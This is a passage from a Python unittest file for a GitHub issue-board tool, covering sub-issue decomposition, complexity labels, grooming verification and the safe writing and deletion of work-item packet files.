        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertFalse(out["deboarded"])
        self.assertIn("error", out)


class DecomposeVerbTest(unittest.TestCase):
    """The effectful decompose verb, driven by an argv-recording FakeRunner and
    an injected set_status seam. Proves the create->wire->stamp sequence and that
    sub-issue numbers come from gh's returned URLs (not positional guessing)."""

    def test_updates_parent_creates_subs_wires_deps_and_stamps(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "docs" / "plans").mkdir(parents=True)
            plan = root / "docs" / "plans" / "p.md"
            plan.write_text("---\ntitle: t\n---\n\nbody\n", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            (root / "s2.md").write_text("sub2", encoding="utf-8")
            spec = {"body_file": "docs/plans/p.md", "sub_issues": [
                {"title": "core", "body_file": "s1.md"},
                {"title": "follow", "body_file": "s2.md", "blocked_by": [0]}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            runner = FakeRunner([
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
                 _ok("https://github.com/o/r/issues/184\n")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "183"],
                 _ok("")),
            ])
            seen = {}
            deboarded = []

            def fake_set_status(parent, stage, ctx, run, force=False):
                seen["call"] = (parent, stage)
                return {"issue": parent, "stage": stage, "previous_stage": None}

            def fake_deboard(number, board, ctx, run):
                deboarded.append(number)
                return {"issue": number, "deboarded": False}

            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=fake_set_status, deboard=fake_deboard)

            self.assertEqual(out["parent"], 182)
            self.assertEqual(out["sub_issue_count"], 2)
            self.assertEqual([s["number"] for s in out["sub_issues"]], [183, 184])
            self.assertEqual(out["sub_issues"][1]["blocked_by"], [183])
            self.assertEqual(out["dependencies_wired"], 1)
            self.assertEqual(seen["call"], (182, "planned"))
            # every created sub-issue is best-effort de-boarded (the Project
            # tracks the parent), and the results ride the verb output.
            self.assertEqual(deboarded, [183, 184])
            self.assertEqual([d["issue"] for d in out["deboarded"]], [183, 184])
            # GitHub is canonical; the transient body input is never modified.
            self.assertEqual(plan.read_text(encoding="utf-8"), "---\ntitle: t\n---\n\nbody\n")
            # every queued gh response was consumed in the exact expected order
            self.assertEqual(runner.responses, [])

    def test_deboard_failure_is_reported_not_fatal(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "p.md").write_text("body", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            spec = {"body_file": "p.md", "sub_issues": [{"title": "core", "body_file": "s1.md"}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
            ])

            def failing_deboard(number, board, ctx, run):
                return {"issue": number, "deboarded": False, "error": "archive blew up"}

            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda *a, **k: {"stage": "planned",
                                                                    "previous_stage": None},
                                        deboard=failing_deboard)
            # non-fatal: the decomposition succeeds; the failure is reported.
            self.assertEqual(out["sub_issue_count"], 1)
            self.assertEqual(out["deboarded"][0]["error"], "archive blew up")

    def test_bad_spec_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps({"sub_issues": []}), encoding="utf-8")  # no plan_path
            runner = FakeRunner([])  # must never be called
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                with self.assertRaises(lb.BoardError) as cm:
                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                      set_status=lambda *a, **k: None)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")
            self.assertEqual(runner.calls, [])  # no gh writes on a malformed spec

    def test_missing_later_sub_body_is_preflighted_before_parent_write(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("first", encoding="utf-8")
            spec = {"body_file": "parent.md", "sub_issues": [
                {"title": "first", "body_file": "s1.md"},
                {"title": "missing", "body_file": "s2.md"}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")
            runner = FakeRunner([])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1,
                                                               source="committed")):
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                      set_status=lambda *a, **k: None)
            self.assertEqual(caught.exception.code, "sub_body_missing")
            self.assertEqual(runner.calls, [])

    def test_mixed_tier_complexity_labels_applied_with_parent_rollup(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            (root / "s1.md").write_text("sub1", encoding="utf-8")
            (root / "s2.md").write_text("sub2", encoding="utf-8")
            # Parent spec-level complexity is `low`, but children are high+low, so
            # the parent ROLLUP must be `high` (max child), not the spec-level value.
            spec = {"body_file": "parent.md", "complexity": "low", "sub_issues": [
                {"title": "core", "body_file": "s1.md", "complexity": "high"},
                {"title": "follow", "body_file": "s2.md", "blocked_by": [0], "complexity": "low"}]}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            runner = FakeRunner([
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
                 _ok("https://github.com/o/r/issues/183\n")),
                (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
                 _ok("https://github.com/o/r/issues/184\n")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "183"], _ok("")),
                # sub 183 -> complexity:high
                (["issue", "view", "183", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
                (["label", "create", "complexity:high", "--repo", "o/r"], _ok("")),
                (["issue", "edit", "183", "--repo", "o/r", "--add-label", "complexity:high"], _ok("")),
                # sub 184 -> complexity:low
                (["issue", "view", "184", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
                (["label", "create", "complexity:low", "--repo", "o/r"], _ok("")),
                (["issue", "edit", "184", "--repo", "o/r", "--add-label", "complexity:low"], _ok("")),
                # parent rollup -> complexity:high (max child)
                (["issue", "view", "182", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
                (["label", "create", "complexity:high", "--repo", "o/r"], _ok("")),
                (["issue", "edit", "182", "--repo", "o/r", "--add-label", "complexity:high"], _ok("")),
            ])
            seen = {}

            def fake_set_status(parent, stage, ctx, run, force=False):
                seen["call"] = (parent, stage)
                return {"issue": parent, "stage": stage, "previous_stage": None}

            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=fake_set_status,
                                        deboard=lambda number, board, ctx, run: {"issue": number, "deboarded": False})

            # AC3: parent label = highest child tier; AC5: planned still stamped.
            self.assertEqual(out["parent_complexity"], "high")
            self.assertEqual([s["complexity"] for s in out["sub_issues"]], ["high", "low"])
            self.assertEqual(seen["call"], (182, "planned"))
            self.assertEqual(runner.responses, [])  # every label call consumed in order

    def test_single_task_parent_uses_own_complexity(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            spec = {"body_file": "parent.md", "complexity": "medium", "sub_issues": []}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            runner = FakeRunner([
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
                # single-task: parent takes its own spec-level complexity
                (["issue", "view", "182", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
                (["label", "create", "complexity:medium", "--repo", "o/r"], _ok("")),
                (["issue", "edit", "182", "--repo", "o/r", "--add-label", "complexity:medium"], _ok("")),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda p, s, c, r, force=False: {"stage": s},
                                        deboard=lambda number, board, ctx, run: {"issue": number, "deboarded": False})
            self.assertEqual(out["parent_complexity"], "medium")
            self.assertEqual(runner.responses, [])


class ComplexityLabelGuardrailTest(unittest.TestCase):
    """Freeze the complexity-label CATEGORY, not a frozen literal set of tiers.

    A guardrail pinned to exact strings false-passes when the surface is renamed
    but still broken; assert the `complexity:` namespace exists, carries self-heal
    metadata, and is applied by verb_decompose. Mirrors the category-not-literal
    policy the status:* labels follow (see skill_transition_ownership_test.py)."""

    def test_complexity_category_is_defined_with_metadata(self) -> None:
        self.assertTrue(lb.COMPLEXITY_LABELS, "complexity label vocabulary must be non-empty")
        for label in lb.COMPLEXITY_LABELS.values():
            # Category, not literal spelling: every label lives in `complexity:`.
            self.assertTrue(label.startswith("complexity:"), label)
            self.assertIn(label, lb.COMPLEXITY_LABEL_META)  # color/description self-heal present

    def test_writer_emits_a_complexity_namespace_label(self) -> None:
        ctx = lb.RepoContext(root=".", main_root=".", origin_owner="o",
                             origin_repo="r", default_branch="main")
        tier = next(iter(lb.COMPLEXITY_TIERS))  # any tier — don't pin which
        label = lb.COMPLEXITY_LABELS[tier]
        runner = FakeRunner([
            (["issue", "view", "5", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
            (["label", "create", label, "--repo", "o/r"], _ok("")),
            (["issue", "edit", "5", "--repo", "o/r", "--add-label", label], _ok("")),
        ])
        out = lb.apply_complexity_label(5, tier, ctx, runner)
        self.assertTrue(out["label"].startswith("complexity:"))

    def test_verb_decompose_is_wired_to_the_complexity_writer(self) -> None:
        # The dispatch unit's complexity must be applied by the SINGLE decompose
        # writer — not re-derived elsewhere. Prove the wiring structurally.
        self.assertIn("apply_complexity_label", inspect.getsource(lb.verb_decompose))


class GroomVerifyVerbTest(unittest.TestCase):
    """The postcondition verb: Status>=planned, with an
    exact sub-issue/blocked count straight from the parent's sub-issue nodes."""

    @staticmethod
    def _issue_payload(stage, subs):
        return json.dumps({"data": {"repository": {"issue": {
            "number": 182, "state": "OPEN", "authorAssociation": "MEMBER", "url": "u",
            "subIssues": {"nodes": subs},
            "projectItems": {"nodes": [{
                "id": "IT_1",
                "project": {"id": "PJ", "number": 1, "owner": {"login": "o"}},
                "fieldValueByName": {"name": stage}}]}}}}})

    def _run(self, root, stage, subs, deboard=None):
        runner = FakeRunner([(["api", "graphql"], _ok(self._issue_payload(stage, subs)))])
        # Default: every touched sub is NOT on the board (no warnings). Tests that
        # exercise the still-boarded path inject their own deboard seam.
        deboard = deboard or (lambda number, board, ctx, run: {"issue": number, "deboarded": False})
        with mock.patch.object(lb, "read_board_config",
                               return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
            return lb.verb_groom_verify(182, _ctx(str(root)), runner, deboard=deboard)

    def _write_plan(self, root, number=182):
        (root / "docs" / "plans").mkdir(parents=True, exist_ok=True)
        (root / "docs" / "plans" / "p.md").write_text(
            f"---\ntitle: t\ngithub_issue: {number}\n---\nbody\n", encoding="utf-8")

    def test_groomed_when_planned_with_plan_doc(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            self._write_plan(root)
            out = self._run(root, "planned", [
                {"number": 183, "state": "OPEN", "blockedBy": {"totalCount": 0}},
                {"number": 184, "state": "OPEN", "blockedBy": {"totalCount": 1}},
                {"number": 185, "state": "OPEN", "blockedBy": {"totalCount": 1}}])
            self.assertTrue(out["groomed"])
            self.assertEqual(out["sub_issue_count"], 3)
            self.assertEqual(out["sub_issues_with_dependencies"], 2)
            self.assertEqual(out["failures"], [])

    def test_groomed_without_plan_doc(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [])  # no plan file written
            self.assertTrue(out["groomed"])
            self.assertEqual(out["failures"], [])

    def test_not_groomed_when_stage_below_planned(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            self._write_plan(root)
            out = self._run(root, "brainstormed", [])
            self.assertFalse(out["groomed"])
            self.assertTrue(any("expected >= planned" in f for f in out["failures"]))

    def test_no_warnings_when_no_sub_is_boarded(self) -> None:
        # The CI-add-after-verify race: at verify time the subs are not yet on
        # the board, so no warning and — critically — groomed stays true.
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [
                {"number": 183, "state": "OPEN", "blockedBy": {"totalCount": 0}}])
            self.assertTrue(out["groomed"])
            self.assertEqual(out["warnings"], [])

    def test_still_boarded_sub_is_a_warning_not_a_failure(self) -> None:
        # A sub is on the board at verify time: best-effort de-board it and record
        # a warning. Warnings never flip `groomed` to false (exit stays 0).
        def boarded(number, board, ctx, run):
            return {"issue": number, "deboarded": True}
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [
                {"number": 183, "state": "OPEN", "blockedBy": {"totalCount": 0}},
                {"number": 184, "state": "CLOSED", "blockedBy": {"totalCount": 0}}],
                deboard=boarded)
            self.assertTrue(out["groomed"])
            self.assertEqual(out["failures"], [])
            # Only the OPEN sub is de-boarded/warned; the CLOSED one is skipped.
            self.assertEqual([w["issue"] for w in out["warnings"]], [183])
            self.assertEqual(out["warnings"][0]["warning"], "sub_issue_on_board")

    def test_failed_deboard_at_verify_is_a_warning(self) -> None:
        def failing(number, board, ctx, run):
            return {"issue": number, "deboarded": False, "error": "boom"}
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [
                {"number": 183, "state": "OPEN", "blockedBy": {"totalCount": 0}}],
                deboard=failing)
            self.assertTrue(out["groomed"])
            self.assertEqual([w["issue"] for w in out["warnings"]], [183])

    def test_second_verify_after_archive_emits_no_repeat_warning(self) -> None:
        # Idempotency at verify against the REALISTIC post-archive payload. Using
        # the REAL _deboard_subissue (deboard=None): the parent read yields one
        # OPEN sub, then the sub is re-read and its item comes back isArchived:true
        # (real GraphQL includeArchived default). parse_issue_state reads that as
        # not-on-board, so _deboard_subissue reports deboarded=False with no error
        # and no archive call fires -> NO repeated warning on the second verify.
        with tempfile.TemporaryDirectory() as d:
            runner = FakeRunner([
                (["api", "graphql"], _ok(self._issue_payload("planned", [
                    {"number": 263, "state": "OPEN", "blockedBy": {"totalCount": 0}}]))),
                (["api", "graphql"], _ok(_subissue_payload(item=True, archived=True))),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
                out = lb.verb_groom_verify(182, _ctx(str(d)), runner, deboard=None)
            self.assertTrue(out["groomed"])
            self.assertEqual(out["warnings"], [])


class PacketVerbTest(unittest.TestCase):
    @staticmethod
    def _payload(stage="planned", state="OPEN"):
        return json.dumps({"data": {"repository": {"issue": {
            "number": 182, "title": "Implement packets", "body": "## Scope\nDo the work",
            "updatedAt": "2026-07-20T12:00:00Z", "state": state,
            "stateReason": "COMPLETED" if state == "CLOSED" else None,
            "url": "https://github.com/o/r/issues/182", "authorAssociation": "MEMBER",
            "blockedBy": {"totalCount": 1, "nodes": [{"number": 9, "title": "Foundation",
                "url": "https://github.com/o/r/issues/9", "state": "OPEN"}]},
            "assignees": {"nodes": []}, "closedByPullRequestsReferences": {"nodes": []},
            "subIssues": {"nodes": [{"number": 183, "title": "Child", "body": "Child body",
                "url": "https://github.com/o/r/issues/183", "state": "OPEN",
                "blockedBy": {"totalCount": 1, "nodes": [{"number": 9,
                    "title": "Foundation", "url": "https://github.com/o/r/issues/9",
                    "state": "OPEN"}]}}]},
            "projectItems": {"nodes": [{"id": "IT_1",
                "project": {"id": "PJ", "number": 1, "owner": {"login": "o"}},
                "fieldValueByName": {"name": stage}}]}}}}})

    def _run(self, common, stage="planned", state="OPEN"):
        ctx = _ctx(str(common / "worktree"))
        runner = FakeRunner([(["api", "graphql"], _ok(self._payload(stage, state)))])
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        return ctx, runner, board

    def test_materialize_is_private_atomic_and_outside_worktree(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx, runner, board = self._run(common)
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                out = lb.verb_materialize_packet(182, ctx, runner)
            path = Path(out["packet_path"])
            self.assertEqual(path, common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md")
            self.assertEqual(path.stat().st_mode & 0o777, 0o600)
            text = path.read_text(encoding="utf-8")
            self.assertIn("## Canonical issue body", text)
            self.assertIn("untrusted requirements data", text)
            self.assertIn("Implement packets", text)
            self.assertIn("#183: Child", text)
            self.assertEqual(list((common / "worktree").iterdir()), [])
            query = next(a for a in runner.calls[0] if a.startswith("query="))
            self.assertNotIn("comments", query)

    def test_materialize_terminal_issue_rejects_and_removes_stale_packet(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx, runner, board = self._run(common, "done", "CLOSED")
            target = common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md"
            target.parent.mkdir(parents=True)
            target.write_text("stale", encoding="utf-8")
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_materialize_packet(182, ctx, runner)
            self.assertEqual(caught.exception.code, "packet_materialize_terminal")
            self.assertFalse(target.exists())

    def test_delete_refuses_non_terminal_issue(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx, runner, board = self._run(common, "in_review", "OPEN")
            target = common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md"
            target.parent.mkdir(parents=True)
            target.write_text("keep", encoding="utf-8")
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_delete_packet(182, ctx, runner)
            self.assertEqual(caught.exception.code, "packet_delete_not_terminal")
            self.assertTrue(target.exists())

    def test_delete_unlinks_only_exact_issue_path(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx, runner, board = self._run(common, "done", "CLOSED")
            directory = common / ".git" / "agentic-engineering" / "work-items"
            directory.mkdir(parents=True)
            target = directory / "o--r--182.md"
            neighbor = directory / "o--r--183.md"
            neighbor.write_text("neighbor", encoding="utf-8")
            target.symlink_to(neighbor)
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                out = lb.verb_delete_packet(182, ctx, runner)
            self.assertTrue(out["deleted"])
            self.assertFalse(target.exists())
            self.assertEqual(neighbor.read_text(encoding="utf-8"), "neighbor")

    def test_symlinked_packet_parent_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            (common / ".git").mkdir()
            escape = common / "escape"
            escape.mkdir()
            (common / ".git" / "agentic-engineering").symlink_to(escape, target_is_directory=True)
            ctx, runner, board = self._run(common)
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_materialize_packet(182, ctx, runner)
            self.assertEqual(caught.exception.code, "packet_path_unsafe")
            self.assertEqual(list(escape.iterdir()), [])

    def test_targeted_reconcile_cleans_abandoned_packet_idempotently(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx = _ctx(str(common / "worktree"))
            payload = json.loads(self._payload("abandoned", "CLOSED"))
            payload["data"]["repository"]["issue"]["subIssues"]["nodes"] = []
            runner = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
            board = lb.BoardConfig(owner="o", number=1, source="committed")
            directory = common / ".git" / "agentic-engineering" / "work-items"
            directory.mkdir(parents=True)
            target = directory / "o--r--182.md"
            neighbor = directory / "o--r--183.md"
            target.write_text("packet", encoding="utf-8")
            neighbor.write_text("neighbor", encoding="utf-8")
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                first = lb.verb_reconcile(ctx, runner, issue=182, force=True)
                runner2 = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
                second = lb.verb_reconcile(ctx, runner2, issue=182, force=True)
            self.assertEqual(first["packet_cleanup"][0]["deleted"], True)
            self.assertEqual(second["packet_cleanup"][0]["deleted"], False)
            self.assertFalse(target.exists())
            self.assertEqual(neighbor.read_text(encoding="utf-8"), "neighbor")


if __name__ == "__main__":
    unittest.main()
